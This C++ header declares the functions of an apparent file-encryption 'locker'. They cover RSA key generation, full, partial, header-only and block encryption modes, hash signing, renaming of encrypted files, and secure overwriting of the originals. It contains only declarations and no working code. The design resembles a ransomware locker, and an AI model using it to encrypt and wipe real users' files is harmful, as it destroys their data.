#ifndef _FILE_SYSTEM_H_
#define _FILE_SYSTEM_H_

#include "locker.h"
#include "structures.h"
#include "pathsystem.h"

namespace filesystem
{
	bool WriteFullData(DESC desc, void* buffer, unsigned size);
	bool ReadRSAFile(CRYPT_INFO* CryptInfo);
	bool OptionEncryptModeAUTO(PFILE_INFO FileInfo);
	bool OptionEncryptModeFULL(PFILE_INFO FileInfo);
	bool OptionEncryptModePARTLY(PFILE_INFO FileInfo);
	bool OptionEncryptModeHEADER(PFILE_INFO FileInfo);
	bool OptionEncryptModeBLOCK(PFILE_INFO FileInfo);
	bool HandlerGenKeyPairRSA();
	bool EncryptRSA(PFILE_INFO FileInfo);
	bool FileCryptEncrypt(PFILE_INFO FileInfo);
	bool FileCryptDecrypt(PFILE_INFO FileInfo);
	bool HashSignatureFile(SLIST<locker::HLIST>* list, DESC HandleHash);
	void sort_hash_list(SLIST<HASH_LIST>* list);
	bool VerifySignatureRSA(SLIST<HASH_LIST>* HashList);
	bool VerificationSignatureFile(SLIST<HASH_LIST>* HashList);
	void RootKeySignatureTrust(VOID);
	PHEAD_BLOCK fill_struct_hblock(DESC recent_handle, const char* crypt_name);

	void sort_hash_list(SLIST<HASH_LIST>* list);
	bool nopHashSumFile(CRYPT_INFO* CryptInfo, DESC desc_file, char* Filename);
	bool HashSumFile(CRYPT_INFO* CryptInfo, DESC desc_file, char* Filename);
	bool hash_file(PCRYPT_INFO CryptInfo, DESC desc, char* fullpath, char* filename);

	char* NameMethodState(PCRYPT_INFO CryptInfo, PDRIVE_INFO data);
	char* OptionNameStandart(PCRYPT_INFO CryptInfo, char* Path, char* Filename, char* exst, char* FPath);
	char* OptionNameHash(PCRYPT_INFO CryptInfo, char* Path, char* Filename, char* exst, char* FPath);
	char* OptionNameBase(PCRYPT_INFO CryptInfo, char* Path, char* Filename, char* exst, char* FPath);

	bool nopOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
	bool ZerosOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
	bool RandomOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
	bool DODOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
	bool RewriteSDelete(CRYPT_INFO* CryptInfo, char* FullPath);
}

#endif